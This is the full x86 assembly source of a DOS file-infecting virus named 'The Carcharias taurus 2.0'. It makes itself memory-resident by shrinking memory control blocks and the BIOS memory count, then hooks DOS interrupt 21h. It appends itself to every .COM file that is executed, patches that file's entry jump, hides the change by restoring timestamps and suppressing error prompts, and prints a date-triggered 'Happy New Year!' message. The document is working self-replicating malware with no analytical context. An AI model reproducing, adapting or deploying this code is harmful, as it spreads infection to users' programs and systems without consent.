TITLE	The Carcharias taurus 2.0
		.MODEL	Tiny
		.CODE
		.STARTUP

; Some Constants -------------------------------------------------------------
	DogSize	equ	584-16-6
; ----------------------------------------------------------------------------

		db	0E9h	 	; JMP Loader
		dw	3
		db	0
		dw	0256h
; ************************** DOG LOADER **************************************
	Loader:

		call	GetBP		; Get BP
	GetBP:	pop	BP
		sub	BP, 103h
		push	AX		; Save AX

; Find Z-MCB -----------------------------------------------------------------
		mov	AH, 52h
		int	21h

		mov	DX, ES:[BX-2]
		mov	DI, (OFFSET Place)-6
		mov	DS:[BP+DI], DX

	NEXT0:
		mov	DI, (OFFSET Place)-6
		mov	ES, DS:[BP+DI]
		mov	DX, ES:[3]	; Calc the next MCB seg
		inc	DX
		add	DS:[BP+DI], DX

		cmp	ES:[0], byte ptr 'Z'
		jne	NEXT0
; ----------------------------------------------------------------------------

; Looking for the Dog behind Z-MCB -------------------------------------------
		push	ES
		mov	DX, ES
                add	DX, ES:[3]
                inc	DX
                mov	ES, DX
                mov	DX, ES:[3]
                pop	ES
                cmp	DX, 815Dh		; 815Dh - Dog's bytes
                je	LExit
; ----------------------------------------------------------------------------


; Eat 1K in the Z-MCB, Current PSP, BIOS Data --------------------------------

		push	DS
		sub	ES:[3], word ptr 40h	; Dec Z-MCB

		mov	AH, 62h
		int	21h
		mov	DS, BX
		sub	DS:[2], word ptr 40h	; Dec Curr PSP

		xor	DX, DX
		mov	DS, DX
		dec	word ptr DS:[413h]

		pop	DS
; ----------------------------------------------------------------------------

; Calculate Dog's segment adress ---------------------------------------------
		mov	DX, CS
		add	DX, ES:[3]
		mov	ES, DX
; ----------------------------------------------------------------------------

; Now load the Dog -----------------------------------------------------------
		xor	DI, DI
		mov	SI, BP
		add	SI, 100h
		mov	CX, DogSize
		cld
		rep 	movsb
; ----------------------------------------------------------------------------

; Hook 21h -------------------------------------------------------------------
; Get old vector
		push	ES
		mov	AX, 3521h
		int	21h
		mov	DX, ES
		pop	ES
		mov	DI, (OFFSET Exit21h)-100h-6+1
		mov	ES:[DI], BX
		inc	DI
		inc	DI
		mov	ES:[DI], DX

; Set 21h to Dog
		mov	AX, 2521h
		mov	DX, (OFFSET Dog)-100h-6
		push	DS
		push	ES
		pop	DS
		int	21h
		pop	DS
; ----------------------------------------------------------------------------

; Loader Exit ----------------------------------------------------------------
	LExit:
; Restore first 6 bytes
		mov	DI, (OFFSET M_6Bytes)-6
		mov	AX, word ptr DS:[BP+DI]
		inc	DI
		inc	DI
		mov	BX, word ptr DS:[BP+DI]
		inc	DI
		inc	DI
		mov	CX, word ptr DS:[BP+DI]
		mov	word ptr CS:[100h], AX
		mov	word ptr CS:[102h], BX
		mov	word ptr CS:[104h], CX

; Restore all registers
		pop	AX
		xor	BX, BX
		xor	CX, CX
		xor	DI, DI
		xor	SI, SI
		xor	BP, BP
		mov	DX, 100h
		push	DX
		xor	DX, DX
		push	DS
		pop	ES
		ret
; ----------------------------------------------------------------------------

; ************************** END of DOG LOADER *******************************


; *******************************  DOG  **************************************
	Dog:
			pushf
			cmp	AX, 4B00h
			je	D01
			jmp	QuickExit
	D01:		push	AX
                        push	BX
                        push	CX
                        push	DX
                        push	DI
                        push	SI
                        push	DS
                        push	ES

                        push	DX                      ; Store file name
                        push	DS


; Effect ? -------------------------------------------------------------------
			mov	AH, 2Ah
			int	21h
			cmp	CX, 1993	; After 1992
			jb	EExit
			cmp	DH, 1		; Jan,
			jne	EExit
			mov	AH, 2Ch
			int	21h
			cmp	CH, 14
			jne	EExit
			cmp	CL, 30
			jb	EExit
; yes!
			push	CS
			pop	DS
			mov	CX, 20
			mov	AH, 2
			mov	SI, (OFFSET Tired)-100h-6
		CHN:	mov	DL, byte ptr DS:[SI]
			inc	SI
			dec	DL
			int	21h
			loop	CHN
;			cli
;			hlt
; ----------------------------------------------------------------------------

		EExit:
; Store old int 24h vector ---------------------------------------------------
			mov	AX, 3524h		; Get intrpt vector (ES:BX)
			int	21h
			mov	DI, (OFFSET Old24h)-100h-6
			mov	CS:[DI], BX		; Store BX
			inc	DI
			inc	DI
			mov	CS:[DI], ES		; Store ES
; ----------------------------------------------------------------------------

; Set new int 24h handler ----------------------------------------------------
			mov	AX, 2524h		; Set intrpt vector (DS:DX)
			mov	DX, (OFFSET INT24)-100h-6
			push	CS
			pop	DS
			int	21h
; ----------------------------------------------------------------------------


;                       -----------------------------------------------------
                        pop	DS
                        pop	DX
; ----------------------------------------------------------------------------


; Open the file --------------------------------------------------------------
			mov	AX, 3D02h
                        int	21h
			mov	DI, (OFFSET Handle)-100h-6
			mov	CS:[DI], AX
                        jnc     D02
			jmp	DExit
               D02:    
; ----------------------------------------------------------------------------

; Read 1st 6 bytes -----------------------------------------------------------
			push	CS
			pop	DS
			mov	AH, 3Fh
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        mov	DX, (OFFSET M_6Bytes)-100h-6
                        mov	CX, 6
                        int	21h
			jnc	D03
			jmp	DExit

           D03:         
; ----------------------------------------------------------------------------

; Check File Format ----------------------------------------------------------
			mov	DI, (OFFSET M_6Bytes)-100h-6
			cmp	CS:[DI], 4D5Ah
                        jne	D04
			jmp	DExit
              D04:      cmp	CS:[DI], 5A4Dh
                        je	DExit
; ----------------------------------------------------------------------------

; Check File for Dog ---------------------------------------------------------
			cmp	CS:[DI+3], 0256h
                        je	DExit
; ----------------------------------------------------------------------------

; Get and Store file Date&Time -----------------------------------------------
			mov	AX, 5700h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        int	21h
                        mov     DI, (OFFSET FDate)-100h-6
                        mov	CS:[DI], DX
                        inc	DI
                        inc	DI
                        mov	CS:[DI], CX
; ----------------------------------------------------------------------------

; Get and Store file Size ----------------------------------------------------
			mov	AX, 4202h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        xor	DX, DX
                        xor	CX, CX
                        int	21h
                        mov     DI, (OFFSET FSize)-100h-6
			sub	AX, 3
                        mov	CS:[DI], AX
                        cmp	AX, 64512
                        ja	DExit
			cmp	AX, 6
			jb	DExit
; ----------------------------------------------------------------------------


; Add Dog to the file --------------------------------------------------------
			push	CS
			pop	DS
			mov	AH, 40h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        mov	CX, DogSize
                        xor	DX, DX
                        int	21h
; ----------------------------------------------------------------------------

; Write 1st 6 bytes to file --------------------------------------------------
; Move file ptr to the start
			mov	AX, 4200h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        xor	DX, DX
                        xor	CX, CX
                        int	21h
; Write ...
			mov	AH, 40h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        mov	CX, 6
                        mov	DX, (OFFSET DogCall)-100h-6
                        int	21h
; ----------------------------------------------------------------------------

        DExit:

; Set file Date&Time ---------------------------------------------------------
			mov	AX, 5701h
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        mov     DI, (OFFSET FDate)-100h-6
                        mov	DX, CS:[DI]
                        inc	DI
                        inc	DI
                        mov	CX, CS:[DI]
                        int	21h
; ----------------------------------------------------------------------------


; Close the file -------------------------------------------------------------
			mov	AH, 3Eh
                        mov	DI, (OFFSET Handle)-100h-6
                        mov	BX, CS:[DI]
                        int	21h
; ----------------------------------------------------------------------------

; Restore int 24h ------------------------------------------------------------
			mov	AX, 2524h		; Set intrpt vector (DS:DX)
			mov	DI, (OFFSET Old24h)-100h-6
			mov	DX, CS:[DI]
			inc	DI
			inc	DI
			mov	DS, CS:[DI]
			int	21h
; ----------------------------------------------------------------------------

			pop	ES
                        pop	DS
                        pop	SI
                        pop	DI
                        pop	DX
                        pop	CX
                        pop	BX
                        pop	AX

	QuickExit:	popf
	Exit21h:	db	0EAh
	Int21hIP:	dw	0		; BX
	Int21hCS:	dw	0		; ES

; Int 24h handler ------------------------------------------------------------
	INT24:		xor	al, al			; Ignore critical error
			iret
; ----------------------------------------------------------------------------


; ****************************  END of DOG  **********************************

	DogData:
		M_6Bytes	db 90h, 90h, 90h, 90h, 90h, 0C3h
		Tired		db 11, 11, 'Ibqqz!Ofx!Zfbs!"', 14, 11
		DogCall		db 0E9h
		FSize		dw 0606h
		Sign		db 'V', 2
		Handle		dw 0606h
		Vers		dw 0606h
		FDate		dw 0606h, 0606h		; Date, Time
		Old24h		dw 0606h, 0606h		; BX:ES
		Attrib		dw 0606h
		Place		dw 0606h		
		END
